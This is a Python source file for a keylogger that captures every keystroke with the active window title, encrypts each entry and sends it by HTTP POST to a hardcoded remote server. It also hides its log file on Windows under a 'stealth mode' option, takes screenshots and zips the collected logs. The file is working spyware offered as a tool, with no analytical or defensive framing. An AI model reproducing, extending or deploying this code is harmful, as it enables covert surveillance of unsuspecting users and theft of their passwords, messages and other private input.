import pynput.keyboard
import os
import subprocess
import threading
import time
import uuid
import datetime
import base64
import pyaes
import requests
import platform
import zipfile
import logging

# For Linux (Ubuntu VM)
DESKTOP_DIR = os.path.join(os.getenv("HOME"), "Desktop")
CAPTURED_DATA_DIR = os.path.join(DESKTOP_DIR, "key_logger_captured_data")
LOG_DIR = os.path.join(CAPTURED_DATA_DIR, "Keylogger")
KEYSTROKES_DIR = os.path.join(LOG_DIR, "keystrokes")
WINDOW_TITLES_DIR = os.path.join(LOG_DIR, "window_titles")
SCREENSHOTS_DIR = os.path.join(LOG_DIR, "screenshots")
ENCRYPTED_LOGS_DIR = os.path.join(LOG_DIR, "encrypted_logs")
OTHER_LOGS_DIR = os.path.join(LOG_DIR, "other_logs")

# Function to create directories
def create_directories():
    try:
        # Create main directory if it doesn't exist
        if not os.path.exists(CAPTURED_DATA_DIR):
            os.makedirs(CAPTURED_DATA_DIR)
        # Create Keylogger directory if it doesn't exist
        if not os.path.exists(LOG_DIR):
            os.makedirs(LOG_DIR)
        # Create keystrokes directory if it doesn't exist
        if not os.path.exists(KEYSTROKES_DIR):
            os.makedirs(KEYSTROKES_DIR)
        # Create window titles directory if it doesn't exist
        if not os.path.exists(WINDOW_TITLES_DIR):
            os.makedirs(WINDOW_TITLES_DIR)
        # Create screenshots directory if it doesn't exist
        if not os.path.exists(SCREENSHOTS_DIR):
            os.makedirs(SCREENSHOTS_DIR)
        # Create encrypted logs directory if it doesn't exist
        if not os.path.exists(ENCRYPTED_LOGS_DIR):
            os.makedirs(ENCRYPTED_LOGS_DIR)
        # Create other logs directory if it doesn't exist
        if not os.path.exists(OTHER_LOGS_DIR):
            os.makedirs(OTHER_LOGS_DIR)
    except Exception as e:
        logging.error(f"Error creating directories: {e}")

# Call the function to create directories
create_directories()

# Key for AES encryption (must be 16, 24, or 32 bytes long)##
AES_KEY = b'\xd4,\x04\xab\xb7W\xddn\xc0\xbf0\x81L\xf9\x9f`G\x82\x8a\xe6\xa9\x19\xdc&\xb6\xab\xc4\xe9\xab(\xaa\xfc' # Replace with your AES key

# Define platform-specific configurations
if platform.system() == "Windows":
    import win32gui
    import win32process
    from PIL import ImageGrab as ImageGrab  # PIL is a cross-platform library
    LOG_FILE_NAME = "keylog.txt"  # Windows
elif platform.system() == "Darwin":
    from Quartz import CGWindowListCopyWindowInfo, kCGWindowListOptionOnScreenOnly, kCGNullWindowID
    from PIL import ImageGrab as ImageGrab  # PIL is a cross-platform library
    LOG_FILE_NAME = "keylog.txt"  # macOS
else:
    import pyscreenshot as ImageGrab  # pyscreenshot works on Linux
    LOG_FILE_NAME = "keylog.txt"  # Linux

LOG_INTERVAL = 60  # Default log interval in seconds
LAST_LOG_TIME = time.time()
LOCK = threading.Lock()

# Remote server URL to send logs
REMOTE_URL = 'https://project-portfolio-one-jet.vercel.app/api/log_keystrokes'

# Configuration options
CONFIG = {
    'log_file_location': os.path.join(LOG_DIR, "keylog_" + str(uuid.uuid4()) + ".txt"),
    'log_interval': LOG_INTERVAL,
    'keys_to_ignore': [],
    'stealth_mode': True,
    'compression': True,
    'logging_application_focus': True,
    'screenshot_capture': True,
    'encrypted_communication': True
}

# Configure logging
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s [%(levelname)s] %(message)s',
                    handlers=[
                        logging.FileHandler(os.path.join(LOG_DIR, "keylogger.log")),
                        logging.StreamHandler()
                    ])


def encrypt(data):
    aes = pyaes.AESModeOfOperationCTR(AES_KEY)
    return aes.encrypt(data)


def decrypt(encrypted_data):
    aes = pyaes.AESModeOfOperationCTR(AES_KEY)
    return aes.decrypt(encrypted_data)


def write_to_file(key):
    global LAST_LOG_TIME
    with LOCK:
        try:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            window_title = ""
            if CONFIG['logging_application_focus']:
                window_title = get_active_window_title()
            log_entry = f"[{timestamp}] [{window_title}] {key}"
            encrypted_entry = encrypt(log_entry.encode())
            if CONFIG['encrypted_communication']:
                send_to_server(base64.b64encode(encrypted_entry).decode())
            else:
                send_to_server(encrypted_entry.decode())
            with open(CONFIG['log_file_location'], "a") as f:
                f.write(log_entry + '\n')
            LAST_LOG_TIME = time.time()
            logging.info(log_entry)
        except Exception as e:
            logging.error(f"Error writing to file: {e}")


def send_to_server(log):
    try:
        response = requests.post(REMOTE_URL, data={'log': log})
        if response.status_code != 200:
            raise Exception(f"Server returned non-200 status code: {response.status_code}")
    except Exception as e:
        logging.error(f"Error sending log to server: {e}")


def hide_console():
    try:
        if platform.system() == "Windows":
            subprocess.call("attrib +h " + os.path.join(LOG_DIR, LOG_FILE_NAME), shell=True)
        else:
            # Add code for other platforms if needed
            pass
    except Exception as e:
        logging.error(f"Error hiding console: {e}")


def get_active_window_title():
    if platform.system() == "Windows":
        window = win32gui.GetForegroundWindow()
        pid = win32process.GetWindowThreadProcessId(window)[1]
        handle = win32process.OpenProcess(0x0410, False, pid)
        title = win32gui.GetWindowText(window)
    elif platform.system() == "Darwin":
        window_list = CGWindowListCopyWindowInfo(
            kCGWindowListOptionOnScreenOnly | kCGNullWindowID)
        title = ""
        for window in window_list:
            title = window.get('kCGWindowOwnerName', '')
            break
    else:
        title = ""
        # Add code for other platforms if needed
    return title


def capture_screenshot():
    try:
        screenshot = ImageGrab.grab()
        with open(os.path.join(SCREENSHOTS_DIR, "screenshot_" + str(uuid.uuid4()) + ".png"), "wb") as f:
            screenshot.save(f, "PNG")
    except Exception as e:
        logging.error(f"Error capturing screenshot: {e}")


def start_keylogger():
    try:
        create_directories()
        if CONFIG['stealth_mode']:
            hide_console()
        with pynput.keyboard.Listener(on_press=write_to_file) as listener:
            listener.join()
    except Exception as e:
        logging.error(f"Error starting keylogger: {e}")


def check_log_time():
    global LAST_LOG_TIME
    while True:
        if time.time() - LAST_LOG_TIME >= CONFIG['log_interval']:
            write_to_file(" ")
        time.sleep(1)


def compress_logs():
    try:
        with zipfile.ZipFile(os.path.join(OTHER_LOGS_DIR, "logs.zip"), 'w') as zipf:
            for root, dirs, files in os.walk(LOG_DIR):
                for file in files:
                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), LOG_DIR))
    except Exception as e:
        logging.error(f"Error compressing logs: {e}")


if __name__ == "__main__":
    start_keylogger()
    threading.Thread(target=check_log_time, daemon=True).start()
    if CONFIG['screenshot_capture']:
        threading.Thread(target=capture_screenshot, daemon=True).start()
    if CONFIG['compression']:
        threading.Thread(target=compress_logs, daemon=True).start()
